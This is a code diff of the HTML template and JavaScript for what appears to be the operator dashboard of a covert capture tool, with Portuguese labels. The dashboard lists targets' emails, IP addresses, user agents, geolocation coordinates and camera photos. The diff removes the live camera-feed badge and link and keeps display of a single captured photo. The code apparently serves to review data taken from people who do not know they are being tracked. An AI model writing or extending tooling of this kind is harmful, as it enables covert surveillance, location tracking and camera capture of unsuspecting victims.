@@ -402,15 +402,7 @@
           {% for c in captures %}
           <tr onclick="showDetail({{ loop.index0 }})">
             <td>{{ c.timestamp[:19].replace("T", " ") }}</td>
-            <td>
-              {{ c.email or "—" }}
-              {% if c.live %}
-                <span style="margin-left:6px;background:#c62828;color:#fff;
-                             padding:1px 7px;border-radius:10px;font-size:10px;font-weight:700">
-                  ● LIVE
-                </span>
-              {% endif %}
-            </td>
+            <td>{{ c.email or "—" }}</td>
             <td title="{{ c.user_agent }}">{{ c.ip }}</td>
             <td>
               {% if c.geo %}
@@ -516,20 +508,10 @@
       html += row('Timezone', geo.timezone || '—');
       html += row('Coordenadas', mapsHtml);
 
-      // Live feed / foto
-      if (c.live || c.has_photo) {
+      if (c.has_photo) {
         const fp = c.fp_token || '';
         html += section('Câmara');
-        if (c.live) {
-          html += row('Estado', `<span style="background:#c62828;color:#fff;padding:2px 10px;border-radius:10px;font-size:12px;font-weight:700;animation:pulse 1.5s infinite">● LIVE</span>`);
-          html += row('Live Feed', `<a href="/livefeed/${fp}" target="_blank"
-            style="display:inline-block;padding:6px 14px;background:#c62828;color:#fff;
-                   font-size:13px;font-weight:600;border-radius:3px;text-decoration:none">
-            📷 Abrir câmara ao vivo
-          </a>`);
-        } else {
-          html += row('Último frame', `<img src="/live/${fp}" style="max-width:100%;border-radius:4px;margin-top:4px;border:1px solid #ddd">`);
-        }
+        html += row('Foto capturada', `<img src="/live/${fp}" style="max-width:100%;border-radius:4px;margin-top:4px;border:1px solid #ddd">`);
       }
 
       html += section('Dispositivo (User-Agent)');
